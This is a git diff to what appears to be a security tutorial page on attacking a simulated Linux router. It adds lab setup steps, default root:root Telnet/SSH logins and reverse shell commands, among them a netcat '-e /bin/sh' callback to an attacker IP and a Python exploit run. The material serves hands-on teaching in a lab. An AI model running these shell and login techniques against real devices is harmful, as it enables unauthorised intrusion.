@@ -136,11 +136,35 @@ We can use the `nvram` command for this. You will not find this command on other
 
 {% embed url="https://www.youtube.com/@Jarrettgxz" %}
 
-**Tools:**
+**Tools covered in the video:**
 
-* ..
+* Nmap, Netcat, Wget, cURL
 
-**Topic overview:**
+**Lab exercise setup**
+
+Practice your skills on a simulated Linux router environment. Download this file and run it from the default downloads (`~/Downloads`) directory:
+
+{% file src="../../.gitbook/assets/network-basics-router-lab (1).run" %}
+
+{% code overflow="wrap" %}
+```shellscript
+# 1. Navigate to directory where the file is stored
+$ cd ~/Downloads
+
+# 2. Run the file
+$ ./network-basics-router-lab.run
+# or
+$ sh network-basics-router-lab.run
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (246).png" alt="" width="563"><figcaption></figcaption></figure>
+
+> Note that the 'Target' and 'Host' IP address values may be different on your machine
+
+
+
+**Content:**
 
 1. Common network services
 
@@ -218,7 +242,7 @@ $ sudo nmap -v <target-IP> --script broadcast-upnp-info
 
 This script automatically attempts to parse the information from the provided XML file (rootDesc.xml). This file provides us with a bunch of useful information (given by UPnP) such as the device name, manufacturer, model, version, etc.
 
-> Note that the IP address will vary according to your target device
+> This script may not work as expected depending on how your Docker environment is setup. Also, the IP address will vary according to your target device
 
 ```bash
 # NSE snmp-interfaces (UDP/161) 
@@ -234,7 +258,7 @@ Reads network configuration data from the target device. The output shows us the
 3. HyperText Transfer Protocol (HTTP)
 
 * Learn about the network protocol used by web servers
-* How to use the `wget` tool to send HTTP requests
+* How to use the `curl` and `wget` tools to send HTTP requests
 
 
 
@@ -242,31 +266,54 @@ Reads network configuration data from the target device. The output shows us the
 
 <figure><img src="../../.gitbook/assets/image (245).png" alt="" width="563"><figcaption></figcaption></figure>
 
-> The `/tmp` directory will usually be used on an actual device to store the temporary binary. However, we are using `/root` in the emulated example
+> The `/tmp` directory will usually be used on an actual device to store the temporary binary. The `/root` directory works too (if you are root)
 
 
 
-4. ...
+4. Telnet and SSH
 
+Provides a direct shell on the device. Commonly exploited by hackers if exposed with weak/hardcoded/default credentials:
 
-
-**Lab exercise setup**
-
-Practice your skills on a simulated Linux router environment. Download this file and run it from the default downloads (`~/Downloads`) directory:
-
-{% file src="../../.gitbook/assets/network-basics-router-lab.run" %}
-
-{% code overflow="wrap" %}
+{% code title="" %}
 ```shellscript
-# 1. Navigate to directory where the file is stored
-$ cd ~/Downloads
+# Telnet
+$ telnet <TARGET-IP>
+Username: root
+Password: root # note that this will not show when being typed 
 
-# 2. Run the file
-$ ./network-basics-router-lab.run
-# or
-$ sh network-basics-router-lab.run
+# SSH
+$ ssh root@<TAREGET-IP>
+Password: root # note that this will not show when being typed 
 ```
 {% endcode %}
+
+
+
+5. Reverse shell techniques (Netcat and Telnet interactive loop)
+
+**5.1 Reverse shell with Netcat**
+
+```shellscript
+# Host (attacker) machine
+$ nc -lvp 8888
+```
+
+> Access Netcat from the Busybox tool
+
+{% code title="Target device" %}
+```console
+# /tmp/busybox nc <ATTACKER-IP> 8888 -e /bin/sh
+```
+{% endcode %}
+
+**5.2 Reverse shelll with Telnet interactive loop method**
+
+{% file src="../../.gitbook/assets/exploit.py" %}
+
+```shellscript
+# Run against the lab target
+$ python3 exploit.py <HOST-IP> <TARGET-IP> 80
+```
 
 
 
